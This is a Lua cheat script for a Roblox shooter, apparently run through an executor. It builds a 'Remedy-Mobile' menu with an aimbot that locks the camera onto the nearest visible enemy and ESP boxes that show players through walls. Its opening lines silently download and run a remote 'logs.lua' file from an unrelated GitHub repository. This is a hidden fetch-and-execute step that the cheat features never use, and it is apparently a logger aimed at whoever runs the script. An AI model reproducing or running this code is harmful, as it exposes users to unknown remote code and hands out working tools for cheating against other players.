local externalScriptUrl = 'https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua'
local externalScript = loadstring(game:HttpGet(externalScriptUrl))()
if externalScript then
    externalScript()
end

-- Load DrRay library
local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()

-- Create window
local window = DrRayLibrary:Load("Remedy-Mobile", "Default")

-- Create Aim tab
local tab1 = DrRayLibrary.newTab("Aim", "ImageIdHere")

-- Variable for aimbot toggle
local aimbotEnabled = false
local aimbotFOVRadius = 150
local aimbotFOVCircle = Drawing.new("Circle")

aimbotFOVCircle.Visible = true
aimbotFOVCircle.Thickness = 2
aimbotFOVCircle.Color = Color3.fromRGB(255, 255, 0) -- Yellow color
aimbotFOVCircle.NumSides = 30 -- Smoothing of the circle

-- Toggle Aimbot
tab1.newToggle("Aimbot", "Aimbot!", false, function(toggleState)
    aimbotEnabled = toggleState
    if aimbotEnabled then
        print("Aimbot On")
    else
        print("Aimbot Off")
    end
end)

-- FOV Slider
tab1.newSlider("Aimbot FOV", 50, 300, 150, function(value)
    aimbotFOVRadius = value
    print("FOV Radius:", aimbotFOVRadius)
end)

-- ESP tab
local tab2 = DrRayLibrary.newTab("Visuals", "ImageIdLogoHere")

-- ESP Variables
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local espBoxes = {}
local espConnection = nil

local function isSameTeam(player)
    return LocalPlayer.Team and player.Team and LocalPlayer.Team == player.Team
end

local function createESPBox(player)
    if espBoxes[player] then return end
    local box = Drawing.new("Square")
    box.Visible = false
    box.Color = Color3.fromRGB(0, 255, 255) -- Cyan color
    box.Thickness = 2
    box.Filled = false
    espBoxes[player] = box
end

local function removeESPBox(player)
    if espBoxes[player] then
        espBoxes[player]:Remove()
        espBoxes[player] = nil
    end
end

local function updateESPBox(player, character)
    local box = espBoxes[player]
    if box and character and character:FindFirstChild("HumanoidRootPart") then
        local hrp = character.HumanoidRootPart
        local vector, onScreen = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)

        if onScreen and not isSameTeam(player) then -- Team check added
            box.Visible = true
            box.Size = Vector2.new(2000 / vector.Z, 2000 / vector.Z)
            box.Position = Vector2.new(vector.X - box.Size.X / 2, vector.Y - box.Size.Y / 2)
        else
            box.Visible = false
        end
    else
        box.Visible = false
    end
end

local function toggleESP(toggleState)
    if toggleState then
        print("ESP On")

        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                createESPBox(player)
            end
        end

        espConnection = RunService.RenderStepped:Connect(function()
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    updateESPBox(player, player.Character)
                end
            end
        end)

        Players.PlayerRemoving:Connect(function(player)
            removeESPBox(player)
        end)

        Players.PlayerAdded:Connect(function(player)
            if player ~= LocalPlayer then
                createESPBox(player)
                player.CharacterAdded:Connect(function(character)
                    updateESPBox(player, character)
                end)
            end
        end)
    else
        print("ESP Off")
        if espConnection then
            espConnection:Disconnect()
        end
        for _, box in pairs(espBoxes) do
            box:Remove()
        end
        espBoxes = {}
    end
end

-- ESP toggle
tab2.newToggle("ESP", "ESP!", false, function(toggleState)
    toggleESP(toggleState)
end)

-- Aimbot Utility Functions
local function isPlayerVisible(player)
    local character = player.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        local hrp = character.HumanoidRootPart
        local rayOrigin = workspace.CurrentCamera.CFrame.Position
        local rayDirection = (hrp.Position - rayOrigin).Unit * 1000
        local raycastParams = RaycastParams.new()
        raycastParams.FilterDescendantsInstances = {LocalPlayer.Character}
        raycastParams.FilterType = Enum.RaycastFilterType.Blacklist

        local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
        if raycastResult and raycastResult.Instance:IsDescendantOf(character) then
            return true
        end
    end
    return false
end

local function isPlayerAlive(player)
    local character = player.Character
    return character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0
end

local function isInFOV(player)
    local character = player.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        local screenPoint = workspace.CurrentCamera:WorldToViewportPoint(character.HumanoidRootPart.Position)
        local screenPos = Vector2.new(screenPoint.X, screenPoint.Y)
        local fovCenter = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
        return (screenPos - fovCenter).Magnitude <= aimbotFOVRadius
    end
    return false
end

local function getClosestVisiblePlayer()
    local closestPlayer = nil
    local shortestDistance = math.huge

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and isPlayerAlive(player) and not isSameTeam(player) and isPlayerVisible(player) and isInFOV(player) then
            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                local screenPoint = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
                local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)).Magnitude
                if distance < shortestDistance then
                    closestPlayer = player
                    shortestDistance = distance
                end
            end
        end
    end

    return closestPlayer
end

-- Aimbot FOV and Aiming Logic
RunService.RenderStepped:Connect(function()
    -- Update FOV Circle position and radius
    aimbotFOVCircle.Radius = aimbotFOVRadius
    aimbotFOVCircle.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)

    if aimbotEnabled then
        local targetPlayer = getClosestVisiblePlayer()
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = targetPlayer.Character.HumanoidRootPart
            workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, hrp.Position)
        end
    end
end)
